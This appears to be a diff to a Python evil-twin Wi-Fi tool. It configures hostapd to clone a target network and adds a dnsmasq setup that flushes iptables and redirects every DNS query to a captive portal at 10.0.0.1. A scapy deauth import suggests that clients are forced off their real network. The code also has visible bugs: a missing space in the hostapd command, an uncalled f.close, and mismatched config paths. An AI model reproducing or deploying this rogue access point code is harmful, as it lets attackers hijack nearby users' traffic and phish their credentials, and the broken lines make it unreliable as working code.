@@ -14,6 +14,7 @@ from scapy.layers.dot11 import Dot11, Dot11Elt, RadioTap, Dot11Deauth, Dot11Beac
 mac = ''
 client_AP = dict()
 AP = {}
+tempFolder = '/tmp/captiveportal'
 presentation = '''
 
   ______           _   _     _______              _         
@@ -238,10 +239,48 @@ def launchHostapd(iface, net):
     hostapdConfig += 'hw_mode=g\n'  # Hardware mode (802.11g)
     hostapdConfig += 'channel=' + AP[net]['channel'] + '\n'  # Channel
     hostapdConfig += 'ignore_broadcast_ssid=0\n'  # Require stations to know SSID to connect (ignore probe requests
-    f = open(hostapdConfigFile, 'w')
+    f = open(os.path.join(tempFolder, hostapdConfigFile), 'w')
     f.write(hostapdConfig)
     f.close()
-    os.system("hostapd -B hostapd.conf")
+
+    # Hostapd initialization
+    os.system('hostapd -B' + os.path.join(tempFolder, hostapdConfigFile))
+    print('[+] hostapd successfully configured')
+
+
+def launchDnsmasq(iface):
+    # Stop dnsmasq daemon in case it's active
+    os.system('service dnsmasq stop')
+    # Flush iptables to avoid conflicts
+    print('[-] Flushing iptables...')
+    os.system('iptables -F')
+    os.system('iptables -t nat -F')
+    print('[+] Iptables flushed')
+    # Config dnsmasq
+    dnsmasqHostsFile = 'hosts'
+    dnsmasqConfigFile = 'dnsmasq.conf'
+    dnsmasqConfig = ''
+    print('[+] Configuring dnsmasq...')
+    dnsmasqConfig += 'interface=' + iface + '\n'  # Interface in which dnsmasq listen
+    dnsmasqConfig += 'dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h\n'  # Range of IPs to set to clients for the DHCP server
+    dnsmasqConfig += 'dhcp-option=3,10.0.0.1\n'  # Set router to 10.0.0.1
+    dnsmasqConfig += 'dhcp-option=6,10.0.0.1\n'  # Set dns server to 10.0.0.1
+    dnsmasqConfig += 'log-queries\n'  # Log all queries
+    dnsmasqConfig += 'address=/#/10.0.0.1\n'  # Response to every DNS query with 10.0.0.1 (where our captive portal is)
+    dnsmasqConfig += 'address=/www.google.com/216.58.209.68\n'
+
+    f = open(dnsmasqConfigFile, 'w')
+    f.write(dnsmasqConfig)
+    f.close
+
+    # Set inet address of interface to 10.0.0.1
+    os.system('ifconfig ' + iface + ' 10.0.0.1')
+
+    # Initialize dnsmasq
+    os.system('dnsmasq -C ' + os.path.join(tempFolder, dnsmasqConfigFile)
+              + ' -H ' + os.path.join(tempFolder, dnsmasqHostsFile))
+
+    print('[+] dnsmasq successfully configured')
 
 
 if __name__ == "__main__":
@@ -271,4 +310,3 @@ if __name__ == "__main__":
     t = Thread(target=launchHostapd, args=(interface, network))
     t.setDaemon(True)
     t.start()
-
